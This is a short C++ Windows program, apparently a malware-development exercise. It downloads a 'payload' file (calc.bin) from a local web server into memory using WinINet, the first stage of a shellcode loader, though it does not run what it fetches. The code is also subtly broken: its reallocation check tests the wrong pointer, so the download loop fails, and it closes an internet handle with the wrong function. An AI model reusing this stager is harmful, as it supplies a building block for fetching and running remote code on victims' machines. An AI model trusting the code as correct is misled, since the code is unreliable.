#include <iostream>
#include <Windows.h>
#include <wininet.h>

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
	DWORD dwBytesRead = 0;
	PBYTE pBytes = NULL;
	SIZE_T sSize = 0;
	const DWORD BUFFER_SIZE = 1024;

	//opening internet session handle
	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet) {
		std::wcerr << L"[!] InternetOpenW Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	//opening handle to the payload url
	HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hInternetFile) {
		std::wcerr << L"[!] InternetOpenUrlW Failed with error : " << GetLastError() << std::endl;
		CloseHandle(hInternet);
		return FALSE;
	}

	PBYTE pTmpBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
	if (!pTmpBuffer) {
		std::wcerr << L"[!] LocalAlloc failed" << std::endl;
		InternetCloseHandle(hInternetFile);
		InternetCloseHandle(hInternet);
		return FALSE;
	}

	while (TRUE) {
		
		//read the payload
		if (!InternetReadFile(hInternetFile, pTmpBuffer, BUFFER_SIZE, &dwBytesRead)) {
			std::wcerr << L"[!] InternetReadFile Failed with error : " << GetLastError() << std::endl;
			LocalFree(pTmpBuffer);
			if (pBytes) LocalFree(pBytes);
			InternetCloseHandle(hInternetFile);
			InternetCloseHandle(hInternet);
			return FALSE;
		}

		if (dwBytesRead == 0) {
			break;
		}
		
		//reallocate buffer to fit new data
		PBYTE pNewBytes = (PBYTE)LocalReAlloc(pBytes, sSize + dwBytesRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
		if (!pBytes) {
			std::wcerr << L"[!] LocalReAlloc failed with error : " << GetLastError() << std::endl;
			LocalFree(pTmpBuffer);
			if (pBytes) LocalFree(pBytes);
			InternetCloseHandle(hInternetFile);
			InternetCloseHandle(hInternet);
			return FALSE;
		}
		pBytes = pNewBytes;

		memcpy(pBytes + sSize, pTmpBuffer, dwBytesRead);
		sSize += dwBytesRead;

	}
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

	
	LocalFree(pTmpBuffer);
	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	return TRUE;
}

int main() {
	PBYTE payload = nullptr;
	SIZE_T payloadSize = 0;

	if (GetPayloadFromUrl(L"http://127.0.0.1:8000/calc.bin", &payload, &payloadSize)) {
		std::wcout << L"[+] Payload downloaded successfully. Size : " << payloadSize << L" Bytes" << std::endl;
		LocalFree(payload);
	}
	else {
		std::wcerr << L"[!] Failed to download payload" << std::endl;
	}
	return 0;
}